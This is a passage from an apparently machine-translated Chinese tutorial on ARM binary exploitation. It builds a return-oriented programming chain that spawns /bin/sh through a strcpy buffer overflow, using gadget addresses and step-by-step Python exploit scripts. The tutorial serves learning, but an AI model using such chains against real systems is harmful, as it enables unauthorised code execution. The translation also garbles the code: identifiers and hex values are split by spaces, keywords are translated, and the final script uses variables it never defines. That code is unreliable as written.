0xB6F91B20)，这样它就没有x20。但同时，我们需要将这个地址重新调整回0xB6F91B20，以便它指向我们的字符串并将“/bin/sh”加载到r0寄存器。要在r0中获得地址0xB6F91B20，首先我们需要提供不包含x20的假地址，然后我们可以使用rop将地址重新调整回0xB6F91B20。您可能会想，如果地址回到0xB6F91B20，会不会将r0寄存器清零？不，寄存器可以保存任何值，这就是我们修改寄存器的原因。当堆栈中出现x20时，只有strcpy终止复制。为此，我们可以再次使用我们的rop工具..</p><p id="d675" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这一次你应该寻找重新调整地址的小工具。你可以寻找add或sub指令来做这件事。我们应该挑选出将r0中的值加或减回指向“/bin/sh”的地址的小工具，并给予我们对pc的控制，这是非常重要的，因为这是我们可以控制执行的唯一方式，以便在这之后我们可以执行系统功能。</p><p id="6e33" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们再次启动ropper并加载libc。寻找修改r0并交还pc控制权的添加或子小工具。我将寻找添加小工具</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi og"><img src="../Images/9fe5b6467b37975e9986ab7949aa7bfa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HNssc5OQ9deTz40ldhky-w.png"/></div></div></figure><blockquote class="nf ng nh"><p id="f69a" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">0x000fe950:加r0，r0，# 0x90pop {r3，PC }；<br/> 0x000fe990:加r0，r0，# 0x94pop {r3，PC }；</p><p id="eeaa" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">0x000fe910:加r0，r0，# 0x80pop {r3，PC }；</p></blockquote><p id="9402" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这三个小工具符合我们上面提到的条件，将会为我们完成工作。你可以从上面的小工具中选择任何一个，我更喜欢这个。</p><blockquote class="nf ng nh"><p id="9ce9" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">0x000fe910:加r0，r0，# 0x80pop {r3，PC }；</p></blockquote><p id="efbe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，这会将0x80加到r0上，并弹出r3和pc。接下来我们要做的是修改漏洞，将“/bin/sh”字符串的地址更改为0x B6 f 91 b 2–0x80，这样我们就可以使用这个小工具添加0x 80，并将r0中的值改回指向“/bin/sh”字符串的地址。之后还有2个pop会pop r3和pc。我们可以把任何垃圾值放在r3和pc上的系统地址里。所以让我们开始吧</p><blockquote class="nf ng nh"><p id="9983" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#!/usr/bin/python <br/>导入结构</p><p id="124d" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">base = 0xb6e74000</p><p id="22c4" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">junk = " A " * 36<br/>gadget 1 = struct . pack("&lt;I "，base+0x 00031874)# ldr gadget<br/>junk 1 = " AAAA "<br/>binsh = struct . pack("&lt;I "，base+0x 11 db 20–0x 80)#/bin/sh string</p><p id="7b11" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">印刷品(垃圾+小配件1+垃圾1+垃圾箱)</p></blockquote><p id="c03a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，如果您运行gdb并检查“ldr r0，[sp，#4]”，我们可以看到0x b 6 f 91 b 20–0x 80，ie = 0xb6f91aa0</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/a1e031ea3f93ef8306061e002c196f60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MWT1tiUciglMh8g3UCW4cA.png"/></div></div></figure><p id="40e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果我们执行si，sp+4 = 0xb6f91aa0的值将载入r0。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oh"><img src="../Images/694be8a420451b0bc391eed196502afd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9a4lww0ETvoA8PosrpJI5A.png"/></div></div></figure><p id="4138" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，第一步完成后，这是一个加法指令，增加8到sp。</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="le lf l"/></div></figure><p id="2f86" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下一步是将我们下一个添加小工具的地址放入pc，我们有pop指令。因此pop {r7，pc }将从堆栈顶部向r7和pc弹出两个值。让我们修改我们的漏洞，以指向下一个小工具</p><blockquote class="nf ng nh"><p id="af2c" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#!/usr/bin/python <br/>导入结构</p><p id="dff7" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">base = 0xb6e74000</p><p id="a45b" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">junk = " A " * 36<br/>gadget 1 = struct . pack("&lt;I "，base+0x 00031874)# ldr gadget<br/>junk 1 = " AAAA "<br/>binsh = struct . pack("&lt;I "，base+0x 11 db 20–0x 80)#/bin/sh string<br/>junk 2 = " AAAA "<br/>gadget 2 = struct . pack("&lt;I "，base+0x 00 fe910)#添加小工具</p><p id="16f1" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">印刷品(垃圾+小配件1+垃圾1+垃圾箱+垃圾2+小配件2)</p></blockquote><p id="2399" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在binsh之后，我们提供了另一个junk2，它将一个垃圾值“AAAA”弹出到r7，下一个值是我们的add小工具的地址，它将弹出到pc，然后pc将指向add小工具，add小工具将pc中的值重新调整为0xB6F91B20，它指向我们的“/bin/sh”字符串。让我们看看这个</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="le lf l"/></div></figure><p id="b125" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在一切都准备好了，剩下唯一要做的就是调用系统函数来获取我们的shell。</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/2bb53b426120d666e110487d24bbd5ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kBuDVh2jYKFMjd2UQP4MFw.png"/></div></div></figure><p id="0b06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该弹出操作将堆栈中的两个值弹出到r3和pc中。像往常一样，我们将插入一些垃圾值到r3，并将系统的地址放入pc。让我们做最后一次。我希望你复制了系统函数的地址:p</p><blockquote class="nf ng nh"><p id="0b52" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">#!/usr/bin/python <br/>导入结构</p><p id="e04b" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">base = 0xb6e74000</p><p id="4e3f" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">junk = " A " * 36<br/>gadget 1 = struct . pack("&lt;I "，base+0x 00031874)# ldr gadget<br/>junk 1 = " AAAA "<br/>binsh = struct . pack("&lt;I "，base+0x 11 db 20–0x 80)#/bin/sh string<br/>junk 2 = " AAAA "<br/>gadget 2 = struct . pack("&lt;I "，base+0x 00 Fe 910)# add gadget【小工具</p><p id="a73f" class="jn jo mx jp b jq jr js jt ju jv jw jx ni jz ka kb nj kd ke kf nk kh ki kj kk ij bi translated">打印(垃圾+小工具1+垃圾1+垃圾+垃圾2+小工具2+垃圾3+系统)</p></blockquote><p id="5556" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，我们在系统变量中提供的地址没有添加libc base，因为它不像其他小工具那样是一个偏移量，而是一个实际的地址。让我们看看我们的漏洞利用布局</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oi"><img src="../Images/58b52ad5016922dcf95baeeacf2635ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ssTWoQ-dAihmDLPEwaiU3Q.png"/></div></div></figure><p id="1717" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的利用现在已经完成了。现在让我们在gdb内部运行它，没有任何断点。</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="mj lf l"/></div></figure><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/a8319f13d36cf28f18bfd396827636c1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C9noo22Z9gTx_VY3tcokjA.png"/></div></div></figure><p id="e555" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">万岁…我们得到了一个贝壳！！！！！</p><p id="6e89" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的努力得到了回报。现在让我们尝试在gdb之外运行它(确保alsr关闭)</p><figure class="kz la lb lc gt ld gh gi paragraph-image"><div role="button" tabindex="0" class="mz na di nb bf nc"><div class="gh gi oa"><img src="../Images/13faeda0368535c7d4eac6e8c40f55ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HqIJn9_16Dey67-l_22Ekw.png"/></div></div></figure><p id="074e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，它工作正常…</p><figure class="kz la lb lc gt ld"><div class="bz fp l di"><div class="oj lf l"/></div><figcaption class="ok ol gj gh gi om on bd b be z dk translated">(sos:鹿野山sama爱情就是战争)</figcaption></figure><p id="d387" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是的，我知道我知道这是一个很长的帖子，几乎很累，但我想尽可能详细说明，以便你们能更好地理解。一定要自己试试。慢慢来，理解这些小工具是如何链接在一起做一些事情的。我建议你接下来尝试使用rop链来调用mprotect()。我将会发表一篇关于它的文章，但不会很快。感谢你花时间阅读这篇文章。我希望这值得你花时间</p><p id="5937" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有兴趣可以看看我的udemy课程:<a class="ae np" href="https://www.udemy.com/course/reverse-engineering-and-binary-exploitation-in-arm/?referralCode=8C725D513E77420A0CBF" rel="noopener ugc nofollow" target="_blank">https://www . udemy . com/course/reverse-engineering-and-binary-exploitation-in-arm/？referral code = 8c 725d 513 e 77420 a 0 CBF</a></p></div><div class="ab cl oo op hu oq" role="separator"><span class="or bw bk os ot ou"/><span class="or bw bk os ot ou"/><span class="or bw bk os ot"/></div><div class="ij ik il im in"><p id="4d6b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果您有任何疑问，请通过facebook与我联系</p><p id="a302" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">https://www.facebook.com/i.am.ultralegend/</p><p id="5744" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">insta gram:<a class="ae np" href="https://www.instagram.com/hagane_no_rekinjutsushi/" rel="noopener ugc nofollow" target="_blank">https://www.instagram.com/hagane_no_rekinjutsushi/</a></p></div></div>    
</body>
</html>